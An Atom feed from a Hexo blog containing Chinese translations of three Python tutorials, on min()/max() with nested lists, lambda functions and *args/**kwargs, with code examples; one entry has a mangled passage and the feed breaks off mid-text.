<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XiaoTaoist&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xiaotaoist.github.io/"/>
  <updated>2019-10-09T14:05:59.683Z</updated>
  <id>https://xiaotaoist.github.io/</id>
  
  <author>
    <name>taoist</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>在Python里如何将min()和max() 与嵌套列表一起使用 （译）</title>
    <link href="https://xiaotaoist.github.io/2019/10/07/python-min-max-and-nested-lists/"/>
    <id>https://xiaotaoist.github.io/2019/10/07/python-min-max-and-nested-lists/</id>
    <published>2019-10-07T12:28:00.000Z</published>
    <updated>2019-10-09T14:05:59.683Z</updated>
    
    <content type="html"><![CDATA[<p>本文用于练习英文阅读，如有侵权，联系删除</p><p><a href="https://dbader.org/blog/python-min-max-and-nested-lists" target="_blank" rel="noopener">原文链接</a>是<strong>Dan Bader</strong>的 How to use Python’s min() and max() with nested lists</p><a id="more"></a><p><strong>以下为译文</strong><br>让我们谈谈在包含另一个列表的列表中使用Python的min()和max()函数。有时这被成为嵌套列表或列表索引。</p><p>根据内部特定属性查找列表的最大或最小元素是一种常见情况，但对与Python新手来说可能是一个挑战。</p><p>下面是一个具体实例，假设这样一个列表，包含权重部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nested_list = [[<span class="string">'cherry'</span>, <span class="number">7</span>], [<span class="string">'apple'</span>, <span class="number">100</span>], [<span class="string">'anaconda'</span>, <span class="number">1360</span>]]</span><br></pre></td></tr></table></figure><p>我们希望Python 根据储存在索引1上的权重选择最小和最大元素。我们预期min和max返回下面元素:</p><ul><li><code>min(nested_list) should be [&#39;cherry&#39;, 7]</code></li><li><code>max(nested_list) should be [&#39;anaconda&#39;, 1360]</code></li></ul><p>但是仅在nested_list 上调用 min 和 max 我们不能得到预期结果。</p><p>我们得到的排序似乎基于存储在索引0处的商品名称:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>min(nested_list)</span><br><span class="line">[<span class="string">'anaconda'</span>, <span class="number">1360</span>]  <span class="comment"># 非预期!</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>max(nested_list)</span><br><span class="line">[<span class="string">'cherry'</span>, <span class="number">7</span>]  <span class="comment"># 非预期!</span></span><br></pre></td></tr></table></figure></p><h1 id="好吧，为什么选错了元素呢？"><a href="#好吧，为什么选错了元素呢？" class="headerlink" title="好吧，为什么选错了元素呢？"></a>好吧，为什么选错了元素呢？</h1><p>让我们停下来思考一下Python的max函数工作原理。算法看起来像这样<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_max</span><span class="params">(sequence)</span>:</span></span><br><span class="line">    <span class="string">"""Return the maximum element of a sequence"""</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sequence:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'empty sequence'</span>)</span><br><span class="line"></span><br><span class="line">    maximum = sequence[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> sequence:</span><br><span class="line">        <span class="keyword">if</span> item &gt; maximum:</span><br><span class="line">            maximum = item</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> maximum</span><br></pre></td></tr></table></figure></p><p>选择最大值的条件下会发现这个有趣的行为: if item &gt; amximum:如果序列的类型只是int 或 float，它能很好的工作，因为比较他们很简单(它符合我们的直觉,例如 3 &gt; 2)。</p><p>但是，如果序列包含其他序列，则情况会变得更加复杂。让我们看一下Python 文档去学习下 <a href="https://docs.python.org/zh-cn/3/tutorial/datastructures.html#comparing-sequences-and-other-types" target="_blank" rel="noopener">比较序列和其他类型</a></p><blockquote><p>序列对象可以与相同类型的其他对象比较。它们使用 字典顺序 进行比较：首先比较两个序列的第一个元素，如果不同，那么这就决定了比较操作的结果。如果它们相同，就再比较每个序列的第二个元素，以此类推，直到有一个序列被耗尽。如果要比较的两个元素本身就是相同类型的序列，那么就递归进行字典顺序比较。</p></blockquote><p>当max需要比较两个序列并寻找最大的元素，默认可能不是我们想要的。</p><p>现在我们了解了为什么会得到意外结果，我们就可以去思考怎样修复代码。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文用于练习英文阅读，如有侵权，联系删除&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dbader.org/blog/python-min-max-and-nested-lists&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文链接&lt;/a&gt;是&lt;strong&gt;Dan Bader&lt;/strong&gt;的 How to use Python’s min() and max() with nested lists&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://xiaotaoist.github.io/categories/Python/"/>
    
    
      <category term="English" scheme="https://xiaotaoist.github.io/tags/English/"/>
    
  </entry>
  
  <entry>
    <title>Python 中的Lambda 函数:他们有什么用 （译）</title>
    <link href="https://xiaotaoist.github.io/2019/09/21/python-lambda-functions/"/>
    <id>https://xiaotaoist.github.io/2019/09/21/python-lambda-functions/</id>
    <published>2019-09-21T11:21:00.000Z</published>
    <updated>2019-10-08T12:37:55.686Z</updated>
    
    <content type="html"><![CDATA[<p>本文用于练习英文阅读，如有侵权，联系删除</p><p><a href="https://dbader.org/blog/python-lambda-functions" target="_blank" rel="noopener">原文链接</a>是<strong>Dan Bader</strong>的 Lambda Functions in Python: What Are They Good For?</p><a id="more"></a><p><strong>以下为译文</strong><br>Python lambda 表达式: 它们的优点，何时使用以及何时最好避免使用他们。</p><p>Python中的lambda关键词提供了声明简短匿名函数的快捷方式。Lambda 函数的行为就像使用def关键字声明的常规函数一样。只要函数对象被声明就可以使用。</p><p>例如，这是定义一个加法功能的简单lambda函数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>add = <span class="keyword">lambda</span> x, y: x + y</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure></p><p>你也可以使用def关键字声明同样的加法函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> x + y</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure></p><p>现在你可能感到惊奇:为什么对lambdas大惊小怪？如果它只是def声明函数的简洁版，有什么大不了的？</p><p>看下面这个例子，并把执行这个操作时把这个函数表达式放在脑海里:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="keyword">lambda</span> x, y: x + y)(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure></p><p>好的，这是怎么回事？我只是用lambda内联定义了一个add 函数，接着用参数5和3进行了调用。</p><p>从概念上讲lambda表达式 lambda x,y:x+y 和用def声明的函数类似，只是用了内联写法。区别在于使用它之前没有绑定到诸如add这样的名称上。我只是说了我想计算的表达式，接着像常规函数一样调用它立刻求值。</p><p>在你继续之前，你可能需要玩味一下前面的代码示例，以便真的理解它的意思。我仍然记得这花了好久去思考。所以要担心花费几分钟去理解它。</p><p>lambdas 和常规函数的另一个语法不同在于:Lamdba 只能是单个表达式。这意味着lambda函数不能使用声明和注释，甚至return语句。</p><p>那么该如何使lambdas返回值？执行lambda函数会评估其表达式，然后自动返回结果。因此，总会有一个隐式的return语句。这就是为什么有些人将lambda称为单表达式函数的原因。</p><h1 id="Lambda的使用"><a href="#Lambda的使用" class="headerlink" title="Lambda的使用"></a>Lambda的使用</h1><p>什么时候你可以使用lambda函数在你的代码中？从技术上讲，任何只要希望提供函数对象的时候都可以使用lambda表达式。并且因为lambda表达式是可以匿名的，你甚至不需要声明它。</p><p>这提供一个方便的非官方的快捷定义Python函数的方法。我最常用到的lambda示例是按照指定键指定规则进行排序：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sorted(range(<span class="number">-5</span>, <span class="number">6</span>), key=<span class="keyword">lambda</span> x: x ** <span class="number">2</span>)</span><br><span class="line">[<span class="number">0</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">-2</span>, <span class="number">2</span>, <span class="number">-3</span>, <span class="number">3</span>, <span class="number">-4</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure></p><p>像常规函数一样，lambda也可以用作词法闭包。</p><p>什么是词法闭包？只是对一种特殊的函数功能的称呼。即使程序流不再位于该作用域，他也能记住封闭的词法作用域的值。这是一个（很学术）的例子来说明这个想法:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">make_adder</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="keyword">lambda</span> x: x + n</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>plus_3 = make_adder(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>plus_5 = make_adder(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>plus_3(<span class="number">4</span>)</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>plus_5(<span class="number">4</span>)</span><br><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure></p><p>在上面例子中 即使 lambda x+n 包含在 make_adder 函数的的作用域中，仍然可以访问n的值。</p><p>有时，使用lambda函数代替使用def声明的嵌套函数可以更清晰地表达自己的意图。但是，老实说这并不常见————至少我很少这么写代码。</p><h1 id="不滥用Lambda"><a href="#不滥用Lambda" class="headerlink" title="不滥用Lambda"></a>不滥用Lambda</h1><p>现在，一方面，我希望本文使你对Python lambda函数感兴趣。另一方面，我觉得需要提出一个警告：Lambda 函数应该被谨慎使用。</p><p>我知道，我使用了lambda表达式编写了一部分看起来“很酷”的代码，但是这对我和我的同事通常是一个负担。如果你想使用lambda，请花几秒（或几分钟）去思考这是否是干净可维护的代码。</p><p>例如，写这样的两行代码去保存变量值是愚蠢的。当然，从技术上讲它是有效的，并且是个很好的“技巧”。但是这会让下一个在有限时间内维护它的人感到困惑：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Harmful:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Car</span>:</span></span><br><span class="line"><span class="meta">... </span>    rev = <span class="keyword">lambda</span> self: print(<span class="string">'Wroom!'</span>)</span><br><span class="line"><span class="meta">... </span>    crash = <span class="keyword">lambda</span> self: print(<span class="string">'Boom!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_car = Car()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_car.crash()</span><br><span class="line"><span class="string">'Boom!'</span></span><br></pre></td></tr></table></figure></p><p>使用复杂的map() 或 filter() 会让我产生和使用lambda相同的困惑。通常用list生成式或生成器会更干净：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 糟糕的:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(filter(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">0</span>, range(<span class="number">16</span>)))</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">14</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更好的:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">16</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">14</span>]</span><br></pre></td></tr></table></figure></p><p>如果你发现自己使用一个复杂的lambda表达式，请考虑用合适的名称定义一个函数代替它。</p><p>从长远来看，节省一些键盘敲击无关紧要。你的同事（和将来的你）更喜欢干净易读的代码。</p><h1 id="要记住的事情"><a href="#要记住的事情" class="headerlink" title="要记住的事情"></a>要记住的事情</h1><ul><li>Lambda 函数不必绑定命名（匿名）</li><li>Lambda 不能使用常规的Python语句，并且始终包含隐式的return语句</li><li>总是问自己: 使用常规(命名)函数或生成器是否会更清晰。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文用于练习英文阅读，如有侵权，联系删除&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dbader.org/blog/python-lambda-functions&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文链接&lt;/a&gt;是&lt;strong&gt;Dan Bader&lt;/strong&gt;的 Lambda Functions in Python: What Are They Good For?&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://xiaotaoist.github.io/categories/Python/"/>
    
    
      <category term="English" scheme="https://xiaotaoist.github.io/tags/English/"/>
    
  </entry>
  
  <entry>
    <title>揭秘 Python args 和 kwargs （译）</title>
    <link href="https://xiaotaoist.github.io/2019/09/15/python-kwargs-and-args/"/>
    <id>https://xiaotaoist.github.io/2019/09/15/python-kwargs-and-args/</id>
    <published>2019-09-15T07:21:00.000Z</published>
    <updated>2019-09-21T11:58:24.677Z</updated>
    
    <content type="html"><![CDATA[<p>本文用于练习英文阅读，如有侵权，联系删除</p><p><a href="https://realpython.com/python-kwargs-and-args/" target="_blank" rel="noopener">原文链接</a>是<strong>Davide Mastromatteo</strong>Python args and kwargs: Demystified</p><a id="more"></a><p><strong>以下为译文</strong><br>有时，当你在查看Python函数定义的时候，你可能会看到这两个奇怪的参数: *args 和 **kwargs 。如果你想知道这两个特殊的变量名是什么，或者你的IDE(集成开发环境)为什么在main()函数里定义他们，这篇文章适合你，你将学到如何使用<code>args</code>和<code>kwargs</code>让你的Python函数定义更灵活。</p><p>读完这篇文章，你将了解:</p><ul><li>*args 和 **kwargs 的实际意思</li><li>如何使用 *args 和 **kwargs 定义函数</li><li>如何使用单星号(*) 解包迭代</li><li>如何使用双星号(**) 解包字典</li></ul><p>本文假设你已经知道如何定义Python函数和列表字典</p><h2 id="将多个参数传递给函数"><a href="#将多个参数传递给函数" class="headerlink" title="将多个参数传递给函数"></a>将多个参数传递给函数</h2><p>*args 和 **kwargs 允许你将多个参数或关键字参数传给一个字典。思考下面这个例子。这是一个给定两个参数返回他们的和的简单函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sum</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br></pre></td></tr></table></figure></p><p>这个函数工作正常，但是他只能接收两个参数。如果你需要对不同数量的参数进行计算，如果传递的参数的个数仅在运行时才能确定，该怎么办？创建一个不管传递多少整数都可以顺利求和的函数会更好。</p><h2 id="在函数定义中使用-Python-args变量"><a href="#在函数定义中使用-Python-args变量" class="headerlink" title="在函数定义中使用 Python args变量"></a>在函数定义中使用 Python args变量</h2><p>有几种方法可以帮你传递不同数量的参数给函数。对于有一些集合经验的人来说，第一种方式最符合直觉。你住需要简单的将List(列表)或者Set（集合）所有的参数传递给你的函数。因此，对于my_sum(),你可以传递需要添加的所有整数的列表：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sum_integers_list.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sum</span><span class="params">(my_integers)</span>:</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> my_integers:</span><br><span class="line">        result += x</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">list_of_integers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">print(my_sum(list_of_integers))</span><br></pre></td></tr></table></figure></p><p>它可以有效的工作，但是你每次调用这个函数都需要创建一个列表传进来。这很不方便，尤其是你可能并不能事先知道所有需要放入列表的值。</p><p>这是<code>*args</code>非常有用的地方，因为它允许你传递不同数量的位置参数，示例如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sum_integers_args.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sum</span><span class="params">(*args)</span>:</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="comment"># Iterating over the Python args tuple</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> args:</span><br><span class="line">        result += x</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">print(my_sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>))</span><br></pre></td></tr></table></figure></p><p>在这个例子里，你不再传递列表给my_sum().相反，你传递了3个不同的位置参数。my_sum获取所有提供的参数所谓输入打包他们放到一个可迭代对象 args中。</p><p>注意，args只是一个名称，你可以不使用args作为名称。你可以选择任何你喜欢的名字，像integers:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sum_integers_args_2.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sum</span><span class="params">(*integers)</span>:</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> integers:</span><br><span class="line">        result += x</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">print(my_sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>))</span><br></pre></td></tr></table></figure></p><p>即使你将可迭代对象integers而不是args传递过去，这个函数仍然有效。这里最重要的是你要使用解包操作符(*)。</p><p>要记住，用解包操作获取的可迭代对象不是List(列表)而是一个元组(tuple)。元组类似与列表，他们都支持切片和迭代。但是元组有一个非常不同的地方，列表是可变的，元组不可变。要测试这一点，可以运行以下代码。下面这个脚本尝试改变列表的值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_list[<span class="number">0</span>] = <span class="number">9</span></span><br><span class="line">print(my_list)</span><br></pre></td></tr></table></figure></p><p>这个位于列表的第一个索引值应该被更新为9。如果你执行这个脚本，你将看到列表确实被修改了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python</span> change_list.py</span><br><span class="line">[9, 2, 3]</span><br></pre></td></tr></table></figure></p><p>第一个值不再是0，被更新成了9.现在尝试用元组做相同的事情。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># change_tuple.py</span></span><br><span class="line">my_tuple = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">my_tuple[<span class="number">0</span>] = <span class="number">9</span></span><br><span class="line">print(my_tuple)</span><br></pre></td></tr></table></figure></p><p>这里，你将看到同样的值，除了他们是用元组组合在一起。如果你尝试执行这个脚本，你将看到Python解释器返回一个错误:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python</span> change_tuple.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"change_tuple.py"</span>, line 3, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    my_tuple[0] = 9</span><br><span class="line">TypeError: <span class="string">'tuple'</span> object does not support item assignment</span><br></pre></td></tr></table></figure></p><p>这是因为元组是一个不可变对象，它的值在赋值后不能再被修改。当你使用元组和*args时，请记住这一点。</p><h2 id="使用Python-kwargs-变量定义函数"><a href="#使用Python-kwargs-变量定义函数" class="headerlink" title="使用Python kwargs 变量定义函数"></a>使用Python kwargs 变量定义函数</h2><p>好的，现在你已经明白了 *args的用途,但**kwargs呢?**kwargs工作方式和*args 差不多，但是它不接收位</p><p>print(concatenate(a=”Real”, b=”Python”, c=”Is”, d=”Great”, e=”!”))<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当你执行上面脚本，concatenate() 将遍历所有Python kwargs字典 并连接它找到的所有值:</span><br><span class="line">```bash</span><br><span class="line">$python concatenate.py</span><br><span class="line">RealPythonIsGreat!</span><br></pre></td></tr></table></figure></p><p>如同 args ，kwargs 可以改成任何你想改成的值。同样，最重要的是解包操作符(**)。</p><p>所以，前面那个例子可以写成下面这种形式:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># concatenate_2.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">concatenate</span><span class="params">(**words)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> words.values():</span><br><span class="line">        result += arg</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">print(concatenate(a=<span class="string">"Real"</span>, b=<span class="string">"Python"</span>, c=<span class="string">"Is"</span>, d=<span class="string">"Great"</span>, e=<span class="string">"!"</span>))</span><br></pre></td></tr></table></figure></p><p>注意,上面这个例子迭代一个标准字典对象。如果<a href="https://realpython.com/iterate-through-dictionary-python/" target="_blank" rel="noopener">迭代字典</a>并像上面那样返回所有值，如示例，你必须使用.values()。</p><p>事实上，如果你忘了这种使用方法。你将发现自己迭代的是Python kwargs 字典的键，如下示例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># concatenate_keys.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">concatenate</span><span class="params">(**kwargs)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="comment"># Iterating over the keys of the Python kwargs dictionary</span></span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> kwargs:</span><br><span class="line">        result += arg</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">print(concatenate(a=<span class="string">"Real"</span>, b=<span class="string">"Python"</span>, c=<span class="string">"Is"</span>, d=<span class="string">"Great"</span>, e=<span class="string">"!"</span>))</span><br></pre></td></tr></table></figure></p><p>注意，如果你尝试执行这个例子，你将注意到一下输出<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python concatenate_keys.py</span><br><span class="line">abcde</span><br></pre></td></tr></table></figure></p><p>如你所见，如果你没有指定.values()，你的函数将迭代Python kwargs字典的键值，返回错误的结果。</p><h2 id="函数参数顺序"><a href="#函数参数顺序" class="headerlink" title="函数参数顺序"></a>函数参数顺序</h2><p>现在，你学习了*args和**kwargs的用途，你就可以使用它们开始编写传入不同数量参数的函数了，但是如果你想创建一个传入可变数量的位置参数和命名参数，怎么办？</p><p>在这种情况下，你必须记住参数顺序，就像非默认参数必须在默认参数前面，*args 也必须在 **kwargs前面。</p><p>总结一下，参数的正确顺序:</p><ol><li>标准参数</li><li>*args 参数</li><li>**kwargs 参数</li></ol><p>例如，下面这个函数定义正确:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># correct_function_definition.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_function</span><span class="params">(a, b, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><p>这个*args 应该在 **kwargs前面列出。但是如果你尝试修改参数的顺序？例如，请思考下面这个函数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wrong_function_definition.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_function</span><span class="params">(a, b, **kwargs, *args)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><p>现在，**kwargs 被放在*args 函数定义前面。如果你尝试运行这个例子，解释器将报错:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python wrong_function_definition.py</span><br><span class="line">  File <span class="string">"wrong_function_definition.py"</span>, line 2</span><br><span class="line">    def my_function(a, b, **kwargs, *args):</span><br><span class="line">                                    ^</span><br><span class="line">SyntaxError: invalid syntax</span><br></pre></td></tr></table></figure></p><p>在这种情况，*args 被放在**kwargs前面，Python 解释器将报语法错误。</p><h2 id="通过星号操作-＆-解码"><a href="#通过星号操作-＆-解码" class="headerlink" title="通过星号操作 * ＆ ** 解码"></a>通过星号操作 * ＆ ** 解码</h2><p>你现在能够用 *args 和 **kwargs 去定义可以传递可变数量参数的Python 函数。让我们来深入了解一下关于<strong>解包操作符</strong>的更多知识。</p><p>在Python2中引入了单星号和双星号解包操作符。从Python 3.5 开始，由于<a href="https://www.python.org/dev/peps/pep-0448/" target="_blank" rel="noopener">PEP 448</a>而变得更强大。简而言之，解包操作符可以解包获取Python里可以迭代的对象。单星号操作符 * 可以在所有Python提供的可迭代对象中使用，双星号操作符 ** 只能在字典中使用。</p><p>让我们看个例子“<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># print_list.py</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">print(my_list)</span><br></pre></td></tr></table></figure></p><p>这个代码定义了一个列表并打印到标准输出里:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_list.py</span><br><span class="line">[1, 2, 